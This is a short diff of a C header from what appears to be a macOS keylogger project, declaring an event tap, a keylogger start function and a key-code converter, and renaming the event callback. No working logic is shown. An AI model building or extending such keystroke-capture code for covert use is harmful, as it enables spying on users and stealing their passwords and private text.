@@ -8,5 +8,5 @@ extern volatile bool stop_keystrokes_stream;
 
 CFMachPortRef eventTap;
 void * start_keylogger_log();
-CGEventRef CGEventCallback_log(CGEventTapProxy, CGEventType, CGEventRef, void*);
+CGEventRef CGEventCallback(CGEventTapProxy, CGEventType, CGEventRef, void*);
 static const char * convert_key_code(int);
